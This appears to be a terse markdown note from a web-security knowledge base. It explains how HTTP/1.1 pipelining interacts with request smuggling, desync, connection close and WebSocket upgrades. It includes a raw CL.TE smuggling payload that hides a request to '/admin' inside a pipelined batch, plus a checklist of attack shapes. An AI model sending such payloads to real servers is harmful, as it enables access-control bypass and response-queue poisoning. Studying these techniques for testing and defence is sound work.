# HTTP pipelining — the multi-request socket

## The shape — many requests on one socket

```text
GET /a HTTP/1.1
Host: t

GET /b HTTP/1.1
Host: t

GET /c HTTP/1.1
Host: t
```

h1.1 pipelining — multiple requests in one TCP write — the back-end
answers them in order — the socket is shared.

## The pipeline-desync — the front-vs-back count

```text
client sends 3 requests → front parses 3 → back parses 2 or 4
```

A parser that merges or splits → the request-count disagrees → the
responses misalign.

## The pipeline + smuggle — the smuggle inside the pipeline

```text
GET / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0

GET / HTTP/1.1
Host: t
```

The smuggle inside a pipelined batch — the batch's boundary shifts.

## The pipeline + upgrade — the tunnel + batch

```text
GET /ws Upgrade:websocket + GET /admin pipelined
```

The upgrade ends the HTTP-pipelining — the tunnel takes over —
`upgrade-smuggling.md`.

## The connection-close — `Connection: close` after N

```text
GET /a HTTP/1.1
Host: t

GET /b HTTP/1.1
Host: t
Connection: close
```

The `close` ends the socket — requests after it are dropped — a
close-desync.

## The pipeline-timeout — the slow-batch

A pipelined batch that exceeds the timeout — the socket closes mid-
batch — the boundary shifts on the timeout.

## The front-end's re-emit — the pipeline's re-framing

The front-end parses the pipeline, re-emits each request — the
re-emission's framing may differ — a re-emit desync.

## The response-order — the FIFO guarantee

h1.1 responses come in request-order — a desync shifts the order —
the queue-poison — `response-poisoning.md`.

## The common pipeline-shapes — the checklist

| Shape | Effect |
|---|---|
| 2 requests, one socket | the shared socket |
| smuggle inside a batch | the boundary-shift |
| `Connection: close` mid-batch | the drop |
| upgrade mid-pipeline | the tunnel |
| pipeline + desync | the queue-poison |
